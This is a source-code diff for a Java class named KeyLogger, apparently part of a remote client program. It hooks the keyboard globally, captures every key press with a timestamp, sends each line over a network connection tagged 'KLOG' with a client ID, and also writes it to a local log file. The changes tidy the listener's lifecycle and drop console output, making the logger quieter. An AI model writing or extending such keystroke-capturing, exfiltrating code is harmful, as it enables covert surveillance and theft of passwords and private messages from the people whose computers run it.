@@ -6,9 +6,8 @@ import java.io.PrintWriter;
 import java.sql.Timestamp;
 import java.text.SimpleDateFormat;
 
-import de.ksquared.system.keyboard.GlobalKeyListener;
-import de.ksquared.system.keyboard.KeyEvent;
-import de.ksquared.system.keyboard.KeyListener;
+import de.ksquared.system.keyboard.*;
+import tools.Connection;
 
 public class KeyLogger extends Thread {
 
@@ -25,9 +24,10 @@ public class KeyLogger extends Thread {
 	
 	@Override
 	public void run(){
-		
+				
 		GlobalKeyListener globalKeyListener = new GlobalKeyListener();
-		globalKeyListener.addKeyListener(new KeyListener(){
+		
+		KeyListener listener = new KeyListener(){
 
 			@Override
 			public void keyPressed(KeyEvent arg0) {
@@ -38,7 +38,9 @@ public class KeyLogger extends Thread {
 			@Override
 			public void keyReleased(KeyEvent arg0) {}
 			
-		});
+		};
+		
+		globalKeyListener.addKeyListener(listener);
 		
 		while (client.doLogKeyboard()) {
 			try {
@@ -46,19 +48,26 @@ public class KeyLogger extends Thread {
 			} catch (InterruptedException e) {}
 		}
 		
+		globalKeyListener.removeKeyListener(listener);
+		
 	}
 	
 	private void log(String event) {
+		
 		String timestamp = SDF.format(
 				new Timestamp(System.currentTimeMillis()));
 		String line = timestamp + "\t" + event;
-		client.getCurConn()
-			  .write("KLOG " + client.getClientId(), line.getBytes());
+		try {
+			new Connection()
+				  .write("KLOG " + client.getClientId(), line.getBytes());
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 		append(line);
 	}
 	
 	private void append(String event) {
-		System.out.println(event);
 		try {
 			PrintWriter out = new PrintWriter(new FileWriter(LOG_FILE, true));
 			out.println(event);
